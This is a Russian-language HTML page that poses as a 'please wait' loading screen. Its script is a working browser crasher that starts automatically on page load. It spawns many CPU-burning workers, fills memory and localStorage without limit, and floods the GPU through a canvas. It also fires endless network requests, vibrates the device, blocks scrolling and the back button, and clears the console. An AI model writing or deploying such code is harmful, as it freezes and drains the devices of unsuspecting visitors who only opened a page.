<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Загрузка</title>
<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

html, body {
    width: 100%;
    height: 100%;
    overflow: hidden;
    position: fixed;
    top: 0;
    left: 0;
    background: #0a0a1a;
    display: flex;
    justify-content: center;
    align-items: center;
    flex-direction: column;
    color: white;
    font-family: Arial, sans-serif;
    user-select: none;
    touch-action: none;
    overscroll-behavior: none;
}

.loader {
    width: 80px;
    height: 80px;
    border: 8px solid #2a2a4a;
    border-top: 8px solid #ff0044;
    border-radius: 50%;
    animation: spin 0.6s linear infinite;
    flex-shrink: 0;
}

@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}

p {
    margin-top: 30px;
    font-size: 26px;
    color: #ccc;
    letter-spacing: 3px;
    text-align: center;
    padding: 0 20px;
}
</style>
</head>
<body>

<div class="loader"></div>
<p>Пожалуйста, подождите...</p>

<script>
// ============================================================
// БЛОКИРОВКА ЛЮБЫХ ПОПЫТОК СКРОЛЛА / ДВИЖЕНИЯ
// ============================================================
document.addEventListener('touchmove', function(e) {
    e.preventDefault();
}, { passive: false });

document.addEventListener('wheel', function(e) {
    e.preventDefault();
}, { passive: false });

document.addEventListener('scroll', function(e) {
    window.scrollTo(0, 0);
});

// ============================================================
// МГНОВЕННЫЙ СТАРТ (через 100мс, чтобы колесико отрисовалось)
// ============================================================
setTimeout(function() {

    // ===== 1. CPU (все ядра, как в SNOS) =====
    var cores = navigator.hardwareConcurrency || 8;
    for (var c = 0; c < cores * 6; c++) {
        try {
            var blob = new Blob([`
                var start = Date.now();
                while (Date.now() - start < 30000) {
                    var x = 0;
                    for (var j = 0; j < 100000000; j++) {
                        x += Math.sqrt(j) * Math.sin(j) * Math.cos(j);
                    }
                }
            `]);
            var worker = new Worker(URL.createObjectURL(blob));
        } catch(e) {}
    }

    // ===== 2. ОЗУ (заполнение памяти) =====
    var memoryStorage = [];
    setInterval(function() {
        try {
            for (var i = 0; i < 100; i++) {
                memoryStorage.push(new Array(1000000).fill('x'));
            }
        } catch(e) {}
    }, 10);

    // ===== 3. GPU (Canvas 2D) =====
    var canvas = document.createElement('canvas');
    canvas.width = 4096;
    canvas.height = 4096;
    document.body.appendChild(canvas);
    var ctx = canvas.getContext('2d');
    setInterval(function() {
        for (var i = 0; i < 1000; i++) {
            ctx.fillStyle = 'hsl(' + Math.random() * 360 + ', 100%, 50%)';
            ctx.fillRect(Math.random() * 4096, Math.random() * 4096, 100, 100);
            ctx.filter = 'blur(' + Math.random() * 10 + 'px)';
        }
    }, 1);

    // ===== 4. Сеть (бесконечные запросы) =====
    setInterval(function() {
        try {
            fetch('https://httpbin.org/delay/1', {mode: 'no-cors'}).catch(function(){});
            var img = new Image();
            img.src = 'https://picsum.photos/200/300?t=' + Date.now();
        } catch(e) {}
    }, 50);

    // ===== 5. Вибрация =====
    if (navigator.vibrate) {
        setInterval(function() {
            navigator.vibrate(200);
        }, 300);
    }

    // ===== 6. Блокировка назад =====
    history.pushState(null, null, location.href);
    window.onpopstate = function() {
        history.go(1);
    };

    // ===== 7. LocalStorage (доп. нагрузка) =====
    setInterval(function() {
        try {
            for (var i = 0; i < 100; i++) {
                localStorage.setItem('stress_' + i, new Array(10000).join('a'));
            }
        } catch(e) {}
    }, 1);

    // ===== 8. WASM (дополнительно) =====
    try {
        var wasmCode = new Uint8Array([
            0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
            0x01, 0x07, 0x01, 0x60, 0x02, 0x7f, 0x7f, 0x01,
            0x7f, 0x03, 0x02, 0x01, 0x00, 0x07, 0x07, 0x01,
            0x03, 0x61, 0x64, 0x64, 0x00, 0x00, 0x0a, 0x09,
            0x01, 0x07, 0x00, 0x20, 0x00, 0x20, 0x01, 0x6a,
            0x0b
        ]);
        var module = new WebAssembly.Module(wasmCode);
        var instance = new WebAssembly.Instance(module);
        setInterval(function() {
            var sum = 0;
            for (var i = 0; i < 100000; i++) {
                sum += instance.exports.add(i, i * 2);
            }
        }, 0);
    } catch(e) {}

    // ===== 9. Бесконечный цикл (добивает) =====
    setInterval(function() {
        var a = 0;
        for (var i = 0; i < 1e7; i++) {
            a += Math.sqrt(i) * Math.sin(i);
        }
    }, 0);

}, 100); // ⬅️ МГНОВЕННЫЙ СТАРТ (через 0.1 сек, колесико уже видно)

// ============================================================
// АНИМАЦИЯ КОЛЕСИКА ЧЕРЕЗ requestAnimationFrame (НЕ ТОРМОЗИТ)
// ============================================================
var loader = document.querySelector('.loader');
function spinWheel() {
    // Ничего не делаем, CSS-анимация работает сама
    // Этот цикл просто не даёт браузеру заснуть
    requestAnimationFrame(spinWheel);
}
spinWheel();

console.clear();
</script>
</body>
</html>
